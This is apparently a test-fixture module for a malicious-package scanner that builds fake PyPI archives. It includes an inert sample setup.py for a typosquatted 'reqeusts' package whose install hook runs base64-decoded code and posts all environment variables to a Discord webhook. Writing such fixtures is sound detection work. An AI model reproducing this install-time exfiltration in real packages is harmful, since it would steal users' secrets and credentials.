"""Build fake package archives in memory for tests. Nothing here is real malware:
the 'malicious' setup.py is inert text that only exists to trip the rules."""

import io
import tarfile
import zipfile

from pkghunter.pypi import Release

EVIL_SETUP = b'''
import base64, os, urllib.request
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
        data = dict(os.environ)
        urllib.request.urlopen("https://discord.com/api/webhooks/123/abc", data=str(data).encode())
        install.run(self)

setup(name="reqeusts", version="1.0", cmdclass={"install": PostInstall})
'''

BENIGN_SETUP = b'''
from setuptools import setup
setup(name="tidy-helpers", version="0.3.1", packages=["tidy_helpers"])
'''

BENIGN_LIB = b'''
import requests

def fetch(url):
    """Normal library code is allowed to use the network."""
    return requests.get(url, timeout=10).text
'''


def make_sdist(files: dict[str, bytes], symlink: tuple[str, str] | None = None) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
        if symlink:
            info = tarfile.TarInfo(symlink[0])
            info.type = tarfile.SYMTYPE
            info.linkname = symlink[1]
            tf.addfile(info)
    return buf.getvalue()


def make_wheel(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


def make_release(name="tidy-helpers", version="0.3.1", releases=3, **info) -> Release:
    base = {"name": name, "version": version, "summary": "Helpers for tidy data",
            "description": "A longer description of a perfectly normal package.",
            "home_page": "https://github.com/example/tidy-helpers", "project_urls": None}
    base.update(info)
    return Release(name=name, version=version, info=base, files=[], release_count=releases)
